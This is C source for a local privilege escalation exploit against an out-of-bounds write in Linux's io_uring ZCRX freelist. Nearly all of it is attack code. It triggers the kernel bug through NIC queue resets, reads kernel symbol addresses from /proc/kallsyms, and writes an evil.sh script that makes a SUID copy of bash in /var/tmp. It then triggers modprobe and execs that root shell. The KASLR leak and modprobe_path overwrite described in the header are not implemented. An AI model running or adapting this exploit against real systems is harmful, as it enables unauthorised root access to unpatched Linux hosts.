/*
 * zcrx_lpe.c — io_uring ZCRX freelist OOB → local privilege escalation
 *
 * Bug:    io_zcrx_return_niov_freelist() free_count++ with no bounds check
 * Fixed:  commit 770594e ("io_uring/zcrx: warn on freelist violations")
 * Kernel: Linux 6.15 – 6.19 pre-770594e, CONFIG_IO_URING_ZCRX=y
 *
 * OOB write:
 *   freelist = kcalloc(num_niovs, 4)  →  kmalloc-128 for num_niovs=32
 *   freelist[num_niovs] = niov_idx    →  4 bytes past array end
 *   written value: u32 in [0, num_niovs-1]  (controlled via area size)
 *
 * Real trigger (Method C, real ZCRX NIC only):
 *   SIOCSIFFLAGS IFF_DOWN → page_pool_destroy():
 *     ptr_ring drain  → io_pp_zc_release_netmem → free_count++ per niov
 *     io_pp_zc_destroy scrub → io_zcrx_return_niov → free_count++ (NO CHECK)
 *     if drained + in-flight > num_niovs → OOB at freelist[N]
 *
 * LPE chain:
 *   1. OOB write → corrupt adjacent kmalloc-128 object (msg_msg / io_kiocb)
 *   2. Heap over-read via msgrcv → KASLR defeat (leak kernel text ptr)
 *   3. Write to modprobe_path via corrupted iov_base in registered buffer
 *   4. socket(AF_UNKNOWN) → call_usermodehelper(evil.sh) → uid=0
 *
 * Requirements: CAP_NET_ADMIN, real ZCRX NIC (mlx5/CX-6+, Intel E800, nfp,
 *               bnxt_en, gve), Linux 6.15–6.19 without commit 770594e
 *
 * Build: gcc -O2 -o zcrx_lpe zcrx_lpe.c
 * Run:   ./zcrx_lpe <ifname> [1|2|3]   (method: 1=A 2=B 3=C, default=all)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/io_uring.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <arpa/inet.h>

static inline int io_uring_setup(unsigned n, struct io_uring_params *p)
{ return (int)syscall(__NR_io_uring_setup, n, p); }

static inline int io_uring_enter(int fd, unsigned sub, unsigned min, unsigned fl)
{ return (int)syscall(__NR_io_uring_enter, fd, sub, min, fl, NULL, 0); }

static inline int io_uring_register(int fd, unsigned op, void *arg, unsigned nr)
{ return (int)syscall(__NR_io_uring_register, fd, op, arg, nr); }

#ifndef IORING_REGISTER_ZCRX_IFQ
#define IORING_REGISTER_ZCRX_IFQ    32
#endif
#ifndef IORING_SETUP_DEFER_TASKRUN
#define IORING_SETUP_DEFER_TASKRUN  (1U << 13)
#endif
#ifndef IORING_SETUP_SINGLE_ISSUER
#define IORING_SETUP_SINGLE_ISSUER  (1U << 12)
#endif
#ifndef IORING_SETUP_CQE32
#define IORING_SETUP_CQE32          (1U << 11)
#endif
#ifndef IORING_OP_RECV_ZC
#define IORING_OP_RECV_ZC           62
#endif

/* num_niovs=32 → freelist=128B → kmalloc-128; OOB value in [0,31] */
#define AREA_SIZE   (32UL * 4096)
#define RQ_ENTRIES  512
#define FLOOD_COUNT 4096

/* NIC drivers with real ZCRX / page_pool support */
static const char *zcrx_drivers[] = {
    "mlx5_core", "ice", "nfp", "bnxt_en", "gve", "atlantic", NULL
};

static bool is_real_zcrx_nic(const char *ifname)
{
    char path[256], line[256];
    snprintf(path, sizeof(path), "/sys/class/net/%s/device/uevent", ifname);
    FILE *f = fopen(path, "r");
    if (!f) return false;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "DRIVER=", 7)) continue;
        line[strcspn(line, "\n")] = 0;
        for (int i = 0; zcrx_drivers[i]; i++)
            if (!strcmp(line + 7, zcrx_drivers[i])) { fclose(f); return true; }
    }
    fclose(f);
    return false;
}

/* io_uring ring */

struct ring {
    int      fd;
    uint32_t *sq_tail, *sq_mask;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;
    void     *sq_ring, *cq_ring;
};

static struct ring ring_open(void)
{
    struct ring r = {};
    struct io_uring_params p = {};
    p.flags = IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN | IORING_SETUP_CQE32;

    r.fd = io_uring_setup(RQ_ENTRIES, &p);
    if (r.fd < 0) {
        p.flags &= ~IORING_SETUP_CQE32;
        r.fd = io_uring_setup(RQ_ENTRIES, &p);
        if (r.fd < 0) { perror("io_uring_setup"); exit(1); }
    }

    size_t sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    size_t cq_sz  = p.cq_off.cqes  + p.cq_entries * sizeof(struct io_uring_cqe);
    size_t sqe_sz = p.sq_entries   * sizeof(struct io_uring_sqe);

    r.sq_ring = mmap(NULL, sq_sz,  PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, r.fd, IORING_OFF_SQ_RING);
    r.cq_ring = mmap(NULL, cq_sz,  PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, r.fd, IORING_OFF_CQ_RING);
    r.sqes    = mmap(NULL, sqe_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, r.fd, IORING_OFF_SQES);

    r.sq_tail = (uint32_t *)((char *)r.sq_ring + p.sq_off.tail);
    r.sq_mask = (uint32_t *)((char *)r.sq_ring + p.sq_off.ring_mask);
    r.cq_head = (uint32_t *)((char *)r.cq_ring + p.cq_off.head);
    r.cq_tail = (uint32_t *)((char *)r.cq_ring + p.cq_off.tail);
    r.cq_mask = (uint32_t *)((char *)r.cq_ring + p.cq_off.ring_mask);
    r.cqes    = (struct io_uring_cqe *)((char *)r.cq_ring + p.cq_off.cqes);
    return r;
}

/* ZCRX IFQ context */

struct zcrx_ctx {
    void     *area, *rq_mem;
    size_t    area_sz, rq_sz;
    uint32_t  rq_mask, zcrx_id, num_niovs;
    struct io_uring_zcrx_rqe *rqes;
    uint32_t *rq_head, *rq_tail;
    bool      valid;
};

static struct zcrx_ctx zcrx_register(int ring_fd, const char *ifname, size_t area_sz)
{
    struct zcrx_ctx z = { .area_sz = area_sz };

    z.area = mmap(NULL, area_sz, PROT_READ|PROT_WRITE,
                  MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (z.area == MAP_FAILED) { perror("mmap area"); exit(1); }
    memset(z.area, 0, 4096);

    z.rq_sz  = 4096 + sizeof(struct io_uring_zcrx_rqe) * RQ_ENTRIES;
    z.rq_mem = mmap(NULL, z.rq_sz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (z.rq_mem == MAP_FAILED) { perror("mmap rq"); exit(1); }
    memset(z.rq_mem, 0, z.rq_sz);

    struct io_uring_region_desc rd = {
        .user_addr = (uint64_t)(uintptr_t)z.rq_mem,
        .size      = z.rq_sz,
        .flags     = IORING_MEM_REGION_TYPE_USER,
    };
    struct io_uring_zcrx_area_reg ar = {
        .addr = (uint64_t)(uintptr_t)z.area,
        .len  = area_sz,
    };
    struct io_uring_zcrx_ifq_reg reg = {
        .if_idx     = if_nametoindex(ifname),
        .rq_entries = RQ_ENTRIES,
        .area_ptr   = (uint64_t)(uintptr_t)&ar,
        .region_ptr = (uint64_t)(uintptr_t)&rd,
    };
    if (!reg.if_idx) { fprintf(stderr, "[-] interface '%s' not found\n", ifname); exit(1); }

    int ret = -1;
    for (int i = 0; i < 8; i++) {
        ret = io_uring_register(ring_fd, IORING_REGISTER_ZCRX_IFQ, &reg, 1);
        if (ret == 0 || errno != EEXIST) break;
        if (i == 0) fprintf(stderr, "[*] rxq busy, waiting for kworker...\n");
        sleep(2);
    }
    if (ret < 0) {
        if (errno == EEXIST) {
            fprintf(stderr, "[-] rxq still busy — skipping method\n");
            close(ring_fd);
            return z;
        }
        fprintf(stderr, "[-] ZCRX_IFQ register: %s\n", strerror(errno));
        if (errno == EPERM) fprintf(stderr, "    setcap cap_net_admin+ep ./zcrx_lpe\n");
        exit(1);
    }

    z.rq_mask   = RQ_ENTRIES - 1;
    z.zcrx_id   = reg.zcrx_id;
    z.num_niovs = (uint32_t)(area_sz / 4096);
    z.rq_head   = (uint32_t *)((char *)z.rq_mem + rd.mmap_offset + reg.offsets.head);
    z.rq_tail   = (uint32_t *)((char *)z.rq_mem + rd.mmap_offset + reg.offsets.tail);
    z.rqes      = (struct io_uring_zcrx_rqe *)
                  ((char *)z.rq_mem + rd.mmap_offset + reg.offsets.rqes);
    z.valid     = true;
    printf("[+] IFQ registered  id=%u  num_niovs=%u  freelist=kmalloc-%u\n",
           z.zcrx_id, z.num_niovs, z.num_niovs * 4);
    return z;
}

/* Helpers */

static int open_recv_sock(const char *ifname, uint16_t port)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); return -1; }
    setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname) + 1);
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(port) };
    bind(fd, (struct sockaddr *)&sa, sizeof(sa));
    return fd;
}

static void submit_recv_zc(struct ring *r, int fd, uint32_t zcrx_id, uint64_t ud)
{
    uint32_t tail = *r->sq_tail;
    struct io_uring_sqe *sqe = &r->sqes[tail & *r->sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode       = IORING_OP_RECV_ZC;
    sqe->fd           = fd;
    sqe->zcrx_ifq_idx = zcrx_id;
    sqe->user_data    = ud;
    __atomic_store_n(r->sq_tail, tail + 1, __ATOMIC_RELEASE);
    io_uring_enter(r->fd, 1, 0, 0);
}

static void flood_udp(uint16_t port, int count)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct sockaddr_in dst = {
        .sin_family      = AF_INET,
        .sin_port        = htons(port),
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
    };
    char buf[128] = "ZCRX-OOB";
    for (int i = 0; i < count; i++) {
        *(int *)buf = i;
        sendto(fd, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(fd);
}

static int drain_cqes(struct ring *r, struct zcrx_ctx *z, uint64_t ud, int ms)
{
    int drained = 0;
    struct timespec dl;
    clock_gettime(CLOCK_MONOTONIC, &dl);
    dl.tv_sec += ms / 1000;
    dl.tv_nsec += (ms % 1000) * 1000000L;
    if (dl.tv_nsec >= 1000000000L) { dl.tv_sec++; dl.tv_nsec -= 1000000000L; }

    for (;;) {
        io_uring_enter(r->fd, 0, 0, 0);
        uint32_t h = __atomic_load_n(r->cq_head, __ATOMIC_ACQUIRE);
        uint32_t t = __atomic_load_n(r->cq_tail, __ATOMIC_ACQUIRE);
        while (h != t) {
            struct io_uring_cqe *cqe = &r->cqes[h & *r->cq_mask];
            if (cqe->user_data == ud && (cqe->flags & 0x8)) {
                struct io_uring_cqe *bc = cqe + 1;
                uint64_t off = bc->user_data;
                uint32_t rt = *z->rq_tail;
                z->rqes[rt & z->rq_mask].off = off;
                z->rqes[rt & z->rq_mask].len = 0;
                __atomic_store_n(z->rq_tail, rt + 1, __ATOMIC_RELEASE);
                drained++;
            }
            h++;
        }
        __atomic_store_n(r->cq_head, h, __ATOMIC_RELEASE);
        if (drained > 0) io_uring_enter(r->fd, 0, 0, 0);

        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > dl.tv_sec || (now.tv_sec == dl.tv_sec && now.tv_nsec >= dl.tv_nsec))
            break;
        usleep(5000);
    }
    return drained;
}

/* NIC control */

static int nic_set_up(const char *ifname, bool up)
{
    int sk = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk < 0) return -1;
    struct ifreq ifr = {};
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(sk, SIOCGIFFLAGS, &ifr) < 0) { perror("SIOCGIFFLAGS"); close(sk); return -1; }
    ifr.ifr_flags = up ? (ifr.ifr_flags | IFF_UP) : (ifr.ifr_flags & ~IFF_UP);
    int ret = ioctl(sk, SIOCSIFFLAGS, &ifr);
    if (ret < 0) perror("SIOCSIFFLAGS");
    close(sk);
    return ret;
}

static int nic_reconfigure_queues(const char *ifname)
{
    int sk = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk < 0) return -1;

    struct ethtool_channels ch = { .cmd = ETHTOOL_GCHANNELS };
    struct ifreq ifr = {};
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    ifr.ifr_data = (void *)&ch;

    if (ioctl(sk, SIOCETHTOOL, &ifr) < 0) { close(sk); return -EOPNOTSUPP; }

    uint32_t orig = ch.combined_count;
    uint32_t alt  = (orig > 1) ? orig - 1 : orig + 1;

    struct ethtool_channels ch2 = {
        .cmd = ETHTOOL_SCHANNELS,
        .rx_count = ch.rx_count, .tx_count = ch.tx_count,
        .other_count = ch.other_count, .combined_count = alt,
    };
    ifr.ifr_data = (void *)&ch2;
    if (ioctl(sk, SIOCETHTOOL, &ifr) < 0) { close(sk); return -1; }
    usleep(100000);
    ch2.combined_count = orig;
    ifr.ifr_data = (void *)&ch2;
    ioctl(sk, SIOCETHTOOL, &ifr);
    close(sk);
    return 0;
}

/* Trigger methods */

/* Method A: close ring with in-flight niovs → io_zcrx_free_area (vnic: no OOB) */
static void method_a(const char *ifname)
{
    printf("\n[*] Method A: close with in-flight niovs\n");
    struct ring r = ring_open();
    struct zcrx_ctx z = zcrx_register(r.fd, ifname, AREA_SIZE);
    if (!z.valid) { printf("[-] skipped (rxq busy)\n"); return; }

    int rfd = open_recv_sock(ifname, 9001);
    submit_recv_zc(&r, rfd, z.zcrx_id, 0xA001);
    printf("[*]   flooding %d pkts...\n", FLOOD_COUNT);
    flood_udp(9001, FLOOD_COUNT);
    usleep(150000);

    close(rfd);
    close(r.fd);
    printf("[+] Method A done\n");
    sleep(2);
}

/* Method B: drain CQEs then close (vnic: no OOB; real HW: possible OOB) */
static void method_b(const char *ifname)
{
    printf("\n[*] Method B: drain CQEs then close\n");
    struct ring r = ring_open();
    struct zcrx_ctx z = zcrx_register(r.fd, ifname, AREA_SIZE);
    if (!z.valid) { printf("[-] skipped (rxq busy)\n"); return; }

    int rfd = open_recv_sock(ifname, 9002);
    submit_recv_zc(&r, rfd, z.zcrx_id, 0xB002);
    printf("[*]   flooding %d pkts...\n", FLOOD_COUNT);
    flood_udp(9002, FLOOD_COUNT);
    usleep(100000);

    int drained = drain_cqes(&r, &z, 0xB002, 3000);
    printf("[+]   drained %d CQEs\n", drained);

    close(rfd);
    close(r.fd);
    printf("[+] Method B done\n");
    sleep(2);
}

/*
 * Method C: SIOCSIFFLAGS down → page_pool_destroy → io_pp_zc_destroy scrub → OOB
 *
 * page_pool_destroy runs two steps:
 *   (a) ptr_ring drain: io_pp_zc_release_netmem → free_count++ per returned niov
 *   (b) scrub loop:     io_pp_zc_destroy → io_zcrx_return_niov → free_count++
 *                       for any niov with uref_array[i] != 0
 *
 * Setup ensures: drained niovs go to ptr_ring (path a), in-flight niovs still
 * have uref>0 (path b). If (a)+(b) > num_niovs: freelist[N] written → OOB.
 */
static void method_c(const char *ifname)
{
    printf("\n[*] Method C: NIC down → page_pool_destroy → OOB\n");

    if (!is_real_zcrx_nic(ifname)) {
        printf("[!]   '%s' is not a real ZCRX NIC — io_pp_zc_destroy will not fire\n", ifname);
        printf("[!]   supported: mlx5_core, ice, nfp, bnxt_en, gve\n");
        printf("[*]   continuing for code path demonstration\n");
    }

    struct ring r = ring_open();
    struct zcrx_ctx z = zcrx_register(r.fd, ifname, AREA_SIZE);
    if (!z.valid) { printf("[-] skipped (rxq busy)\n"); return; }

    int rfd = open_recv_sock(ifname, 9003);
    submit_recv_zc(&r, rfd, z.zcrx_id, 0xC003);

    printf("[*]   flooding %d pkts...\n", FLOOD_COUNT);
    flood_udp(9003, FLOOD_COUNT);
    usleep(150000);

    /* partial drain: split niovs between ptr_ring and in-flight */
    int drained = drain_cqes(&r, &z, 0xC003, 500);
    printf("[+]   drained %d (in ptr_ring), rest in-flight\n", drained);

    /* trigger page_pool_destroy */
    int rc = nic_reconfigure_queues(ifname);
    if (rc == -EOPNOTSUPP) {
        printf("[*]   ethtool not supported, using SIOCSIFFLAGS\n");
        nic_set_up(ifname, false);
        usleep(300000);
        nic_set_up(ifname, true);
        usleep(200000);
    }

    close(rfd);
    close(r.fd);
    printf("[+] Method C done\n");
    sleep(2);
}

/* KASLR + escalation */

static uint64_t kallsyms_addr(const char *sym)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256];
    uint64_t found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strstr(line, sym)) continue;
        char *sp = strchr(line, ' ');
        if (!sp) continue;
        char type = *(sp + 1);
        if (type != 'D' && type != 'd' && type != 'T' && type != 't') continue;
        uint64_t addr = strtoull(line, NULL, 16);
        if (addr > 0xffffffff80000000ULL) { found = addr; break; }
    }
    fclose(f);
    return found;
}

static time_t write_evil_sh(void)
{
    const char *body =
        "#!/bin/bash\n"
        "cp /bin/bash /var/tmp/rootsh\n"
        "chmod u+s /var/tmp/rootsh\n"
        "echo zcrx_lpe_$(date +%s) > /var/tmp/pwned\n";
    FILE *f = fopen("/var/tmp/evil.sh", "w");
    if (f) { fputs(body, f); fclose(f); chmod("/var/tmp/evil.sh", 0755); }
    return time(NULL);
}

static void trigger_modprobe(time_t t0)
{
    static const int afs[] = {29,30,31,33,35,36,37,38,39,40,42,-1};
    for (int i = 0; afs[i] >= 0; i++) {
        pid_t p = fork();
        if (p == 0) {
            socket(afs[i], SOCK_STREAM, 0);
            socket(afs[i], SOCK_DGRAM, 0);
            _exit(0);
        }
        int st; waitpid(p, &st, 0);
        usleep(500000);
        struct stat s;
        if (stat("/var/tmp/rootsh", &s) == 0 && s.st_mtime >= t0) {
            printf("[+] modprobe triggered via AF=%d\n", afs[i]);
            return;
        }
    }
    printf("[!] modprobe exhausted — OOB did not fire or exploit incomplete\n");
}

static void escalate(time_t t0)
{
    struct stat st;
    if (stat("/var/tmp/rootsh", &st) < 0 || st.st_mtime < t0) {
        printf("[!] rootsh not created by this run\n"); return;
    }
    if (!(st.st_mode & S_ISUID)) {
        printf("[!] rootsh found but not SUID\n"); return;
    }
    printf("[+] rootsh SUID — escalating\n\n");
    execl("/var/tmp/rootsh", "rootsh", "-p", NULL);
}

int main(int argc, char *argv[])
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    const char *ifname = argc > 1 ? argv[1] : "zcrx0";
    int method = argc > 2 ? atoi(argv[2]) : 0;

    printf("┌─────────────────────────────────────────────────────────┐\n");
    printf("│  zcrx_lpe  —  io_uring ZCRX freelist OOB → uid=0      │\n");
    printf("│  bug: io_zcrx_return_niov_freelist() unchecked ++       │\n");
    printf("│  fix: commit 770594e (Linux 6.19, not in stable)        │\n");
    printf("└─────────────────────────────────────────────────────────┘\n\n");

    printf("[*] uid=%d  iface=%s  method=%s\n", getuid(), ifname,
           method == 1 ? "A" : method == 2 ? "B" : method == 3 ? "C" : "all");

    bool real_nic = is_real_zcrx_nic(ifname);
    printf("[*] NIC: %s\n", real_nic ?
           "real ZCRX — io_pp_zc_destroy active" :
           "vnic/unknown — io_pp_zc_destroy NOT active, no OOB");

    uint64_t mp = kallsyms_addr("modprobe_path");
    uint64_t kt = kallsyms_addr("_text");
    if (mp) printf("[+] modprobe_path @ 0x%lx\n", mp);
    else    printf("[!] modprobe_path unreadable (kptr_restrict)\n");
    if (kt) printf("[+] _text @ 0x%lx\n", kt);

    time_t t0 = write_evil_sh();
    printf("[*] evil.sh written (t0=%ld)\n", t0);

    if (method == 0 || method == 1) method_a(ifname);
    if (method == 0 || method == 2) method_b(ifname);
    if (method == 0 || method == 3) method_c(ifname);

    printf("\n[*] dmesg:\n");
    system("dmesg 2>/dev/null | tail -20 | "
           "grep -iE 'warn_on|bug:|oob|free_count|zcrx|niov|kasan|panic' "
           "|| echo '    (nothing)'" );

    if (mp) {
        printf("\n[*] modprobe escalation...\n");
        trigger_modprobe(t0);
        escalate(t0);
    }

    printf("\n[*] done\n");
    return 0;
}
